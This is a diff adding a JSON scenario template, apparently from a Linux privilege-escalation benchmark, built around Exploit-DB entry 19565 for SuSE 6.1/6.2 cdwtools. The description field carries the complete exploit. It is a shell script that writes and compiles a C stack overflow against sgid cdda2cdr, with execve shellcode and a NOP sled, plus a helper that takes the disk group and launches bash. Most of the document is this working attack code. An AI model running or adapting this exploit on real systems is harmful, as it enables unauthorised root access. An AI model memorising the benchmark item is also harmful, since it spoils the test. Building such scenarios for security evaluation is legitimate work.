@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_19565",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: SuSE Linux 6.1/6.2 - 'cwdtools' Local Overflow / Local Privilege Escalation (CVE-2000-0362;OSVDB-1123)\n\nExploit source code (19565.sh):\n```\n#!/bin/sh\n#source: https://www.securityfocus.com/bid/738/info\n#\n#cdwtools is a package of utilities for cd-writing. The linux version of these utilities, which ships with S.u.S.E linux 6.1 and 6.2, is vulnerable to several local root #compromises. It is known that there are a number of ways to exploit these packages, including buffer overflows and /tmp symlink attacks.\n#\n#--- cdda2x.sh ---\n#!/bin/sh\n#\n# Shell script for Linux x86 cdda2cdr exploit\n# Brock Tellier btellier@usa.net\n#\n\ncat > /tmp/cdda2x.c <<EOF\n\n/**\n ** Linux x86 exploit for /usr/bin/cdda2cdr (sgid disk on some Linux distros)\n\n ** gcc -o cdda2x cdda2x.c; cdda2x <offset> <bufsiz>\n **\n ** Brock Tellier btellier@usa.net\n **/\n\n\n#include <stdlib.h>\n#include <stdio.h>\n\nchar exec[]= /* Generic Linux x86 running our /tmp program */\n  \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\"\n  \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\"\n  \"\\x80\\xe8\\xdc\\xff\\xff\\xff/tmp/cd\";\n\n\n\n#define LEN 500\n#define NOP 0x90\n\nunsigned long get_sp(void) {\n\n__asm__(\"movl %esp, %eax\");\n\n}\n\n\nvoid main(int argc, char *argv[]) {\n\nint offset=0;\nint i;\nint buflen = LEN;\nlong int addr;\nchar buf[LEN];\n\n if(argc > 3) {\n  fprintf(stderr, \"Error: Usage: %s offset buffer\\n\", argv[0]);\n exit(0);\n }\n else if (argc == 2){\n   offset=atoi(argv[1]);\n\n }\n else if (argc == 3) {\n   offset=atoi(argv[1]);\n   buflen=atoi(argv[2]);\n\n }\n else {\n   offset=500;\n   buflen=500;\n\n }\n\n\naddr=get_sp();\n\nfprintf(stderr, \"Linux x86 cdda2cdr local disk exploit\\n\");\nfprintf(stderr, \"Brock Tellier btellier@usa.net\\n\");\nfprintf(stderr, \"Using addr: 0x%x\\n\", addr+offset);\n\nmemset(buf,NOP,buflen);\nmemcpy(buf+(buflen/2),exec,strlen(exec));\nfor(i=((buflen/2) + strlen(exec))+1;i<buflen-4;i+=4)\n *(int *)&buf[i]=addr+offset;\n\nexecl(\"/usr/bin/cdda2cdr\", \"cdda2cdr\", \"-D\", buf, NULL);\n\n\n/*\nfor (i=0; i < strlen(buf); i++) putchar(buf[i]);\n*/\n\n}\n\nEOF\n\ncat > /tmp/cd.c <<EOF\nvoid main() {\n    setregid(getegid(), getegid());\n    system(\"/bin/bash\");\n}\nEOF\n\ngcc -o /tmp/cd /tmp/cd.c\ngcc -o /tmp/cdda2x /tmp/cdda2x.c\necho \"Note that gid=6 leads to easy root access..\"\n/tmp/cdda2x\n```",
+  "cve": "CVE-2000-0362;OSVDB-1123",
+  "exploitdb_id": "19565",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_19565",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
